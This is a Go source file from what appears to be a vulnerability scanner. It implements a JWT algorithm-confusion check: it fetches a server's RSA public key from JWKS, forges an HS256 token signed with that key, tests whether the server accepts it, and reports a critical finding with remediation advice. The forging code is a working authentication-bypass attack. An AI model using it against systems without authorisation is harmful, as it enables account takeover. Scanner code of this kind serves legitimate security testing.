package jwtengine

import (
	"DORM/models"
	"encoding/base64"
	"encoding/json"
	"strings"
)

// RunAlgConfusionAttack (Attack 3): if the original token uses an asymmetric
// algorithm (RS*/ES*/PS*), fetches the server's public key from JWKS and
// forges an HS256 token using that public key as the HMAC secret. Decodes
// its own local copy of the original header, independent of RunAlgNoneAttack's
// mutations, so the two attacks can't interfere with each other.
func RunAlgConfusionAttack(target models.ScanTarget, baseURL, origHeaderB64, origPayloadB64 string, testToken func(tok, endpoint string) bool) *models.Vulnerability {
	headerBytes, err := base64.RawURLEncoding.DecodeString(origHeaderB64)
	if err != nil {
		return nil
	}
	var headerMap map[string]interface{}
	if json.Unmarshal(headerBytes, &headerMap) != nil {
		return nil
	}

	alg, _ := headerMap["alg"].(string)
	if !strings.HasPrefix(alg, "RS") && !strings.HasPrefix(alg, "ES") && !strings.HasPrefix(alg, "PS") {
		return nil
	}

	rsaPub := FetchRSAPublicKey(baseURL)
	if rsaPub == nil {
		return nil
	}
	pemBytes := RSAPublicKeyToPEM(rsaPub)
	if pemBytes == nil {
		return nil
	}

	// Forge an HS256 token using the RSA public key as the HMAC secret
	hs256HeaderMap := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
	}
	hs256HeaderJSON, _ := json.Marshal(hs256HeaderMap)
	hs256HeaderB64 := base64.RawURLEncoding.EncodeToString(hs256HeaderJSON)
	confusionToken := models.SignHS256(hs256HeaderB64, origPayloadB64, pemBytes)

	if testToken(confusionToken, "/") {
		return &models.Vulnerability{
			Target:   target,
			Name:     "JWT Algorithm Confusion Attack (RS256 → HS256)",
			Severity: "CRITICAL",
			CVSS:     9.8,
			Description: "Server accepted an HS256 token signed with its own RSA public key.\n" +
				"The public key (obtainable from JWKS endpoint) was used as the HMAC secret,\n" +
				"bypassing signature verification entirely. Full account takeover possible.",
			Solution:  "Enforce algorithm type in JWT verification. Never mix asymmetric/symmetric key validators.",
			Reference: "CVE-2016-5431 / PortSwigger JWT Algorithm Confusion",
		}
	}
	return nil
}
